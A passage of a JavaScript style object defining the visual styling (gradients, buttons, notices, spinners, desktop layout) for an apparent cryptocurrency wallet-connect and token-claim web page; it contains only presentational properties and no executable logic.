  environmentNotice: {
    background: 'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
    border: '2px solid #fbbf24',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: '#92400e',
    fontSize: '14px',
    fontWeight: '600',
    lineHeight: '1.4',
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    animation: 'pulse 2s infinite'
  },
  
  noticeIcon: {
    fontSize: '24px',
    flexShrink: 0
  },
  
  noticeContent: {
    flex: 1
  },
  
  connectedWallet: {
    background: 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)',
    border: '2px solid #6ee7b7',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    boxShadow: '0 4px 12px rgba(16, 185, 129, 0.2)',
    animation: 'slideUp 0.4s ease-out'
  },
  
  walletInfo: {
    flex: 1,
    minWidth: 0
  },
  
  walletLabel: {
    fontSize: '12px', 
    color: '#065f46', 
    marginBottom: '4px',
    fontWeight: '600',
    textTransform: 'uppercase',
    display: 'flex',
    alignItems: 'center',
    gap: '6px'
  },
  
  walletAddress: {
    fontSize: '14px', 
    fontWeight: 'bold', 
    color: '#047857',
    fontFamily: 'monospace',
    wordBreak: 'break-all',
    display: 'flex',
    alignItems: 'center',
    gap: '8px'
  },
  
  disconnectButton: {
    background: '#dc2626',
    color: 'white',
    border: 'none',
    padding: '8px 16px',
    borderRadius: '8px',
    fontSize: '12px',
    fontWeight: 'bold',
    cursor: 'pointer',
    marginLeft: '12px',
    flexShrink: 0,
    transition: 'all 0.2s',
    boxShadow: '0 2px 6px rgba(220, 38, 38, 0.3)'
  },
  
  claimButton: {
    width: '100%',
    background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
    color: 'white',
    border: 'none',
    padding: '18px',
    borderRadius: '12px',
    fontSize: '18px',
    fontWeight: 'bold',
    cursor: 'pointer',
    transition: 'all 0.3s',
    boxShadow: '0 8px 20px rgba(16, 185, 129, 0.4)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    marginBottom: '20px',
    animation: 'pulse 2s infinite'
  },
  
  connectButton: (connecting, walletAddress) => ({
    width: '100%',
    background: walletAddress 
      ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
      : connecting
      ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
      : 'linear-gradient(135deg, #9333ea 0%, #6d28d9 100%)',
    color: 'white',
    border: 'none',
    padding: '18px',
    borderRadius: '12px',
    fontSize: '18px',
    fontWeight: 'bold',
    cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
    transition: 'all 0.3s',
    boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
    textTransform: 'uppercase',
    letterSpacing: '1px',
    opacity: connecting || walletAddress ? 0.7 : 1,
    transform: 'scale(1)'
  }),
  
  autoDetectMessage: {
    width: '100%',
    background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
    color: '#1e40af',
    border: '2px solid #93c5fd',
    borderRadius: '12px',
    padding: '16px',
    textAlign: 'center',
    fontSize: '14px',
    fontWeight: '600',
    marginBottom: '20px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    gap: '12px'
  },
  
  statusMessage: (isError, isSuccess) => ({
    background: isError ? 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)' : 
             isSuccess ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
             'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
    border: isError ? '2px solid #f87171' : 
            isSuccess ? '2px solid #6ee7b7' : 
            '2px solid #fbbf24',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: isError ? '#b91c1c' : 
           isSuccess ? '#065f46' : 
           '#92400e',
    fontSize: '14px',
    fontWeight: '500',
    lineHeight: '1.5',
    whiteSpace: 'pre-line',
    boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
    animation: 'slideUp 0.3s ease-out'
  }),
  
  connectingMessage: {
    background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
    border: '2px solid #93c5fd',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: '#1e40af',
    fontSize: '14px',
    fontWeight: '600',
    lineHeight: '1.6',
    whiteSpace: 'pre-line',
    display: 'flex',
    alignItems: 'flex-start',
    gap: '10px',
    boxShadow: '0 4px 12px rgba(59, 130, 246, 0.2)',
    animation: 'slideUp 0.3s ease-out'
  },
  
  spinnerSmall: {
    width: '24px',
    height: '24px',
    border: '3px solid #1e40af',
    borderTopColor: 'transparent',
    borderRadius: '50%',
    animation: 'spin 1s linear infinite',
    flexShrink: 0,
    marginTop: '2px'
  },
  
  connectionText: {
    flex: 1
  },
  
  errorMessage: {
    background: 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)',
    border: '2px solid #f87171',
    borderRadius: '12px',
    padding: '12px',
    marginBottom: '16px',
    color: '#b91c1c',
    fontSize: '13px',
    fontWeight: '500',
    lineHeight: '1.4'
  },
  
  footerText: {
    marginTop: '16px',
    fontSize: '12px',
    color: '#6b7280',
    textAlign: 'center',
    lineHeight: '1.5'
  },
  
  footer: {
    marginTop: '24px',
    textAlign: 'center',
    color: 'rgba(255,255,255,0.85)',
    fontSize: '13px',
    lineHeight: '1.5'
  },
  
  // Desktop styles
  desktopContainer: {
    minHeight: '100vh',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: '20px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
  },
  
  desktopCard: {
    background: 'white',
    borderRadius: '24px',
    padding: '40px',
    maxWidth: '500px',
    textAlign: 'center',
    boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
    border: '1px solid rgba(255,255,255,0.5)'
  },
  
  desktopTitle: {
    fontSize: '28px',
    marginBottom: '16px',
    color: '#1f2937',
    fontWeight: 'bold'
  },
  
  desktopText: {
    color: '#6b7280',
    lineHeight: '1.6',
    marginBottom: '24px',
    fontSize: '16px'
  },
  
  buttonsContainer: {
    display: 'flex',
    flexDirection: 'column',
    gap: '12px',
    marginBottom: '24px'
  },
  
  installButton: {
    background: 'linear-gradient(135deg, #9333ea 0%, #6d28d9 100%)',
    color: 'white',
    border: 'none',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    cursor: 'pointer',
    transition: 'all 0.3s',
    boxShadow: '0 4px 12px rgba(102, 126, 234, 0.3)'
  },
  
  refreshButton: {
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    color: 'white',
    border: 'none',
    padding: '12px 24px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    cursor: 'pointer',
    transition: 'all 0.3s',
    boxShadow: '0 4px 12px rgba(102, 126, 234, 0.3)'
  },
  
  urlBox: {
    background: '#f3f4f6',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '14px',
    color: '#374151',
    marginBottom: '20px',
    wordBreak: 'break-all'
  },
  
  urlCode: {
    fontSize: '11px',
    fontFamily: 'monospace',
    display: 'block',
    marginTop: '6px',
    background: '#e5e7eb',
    padding: '4px 8px',
    borderRadius: '4px'
  }
};
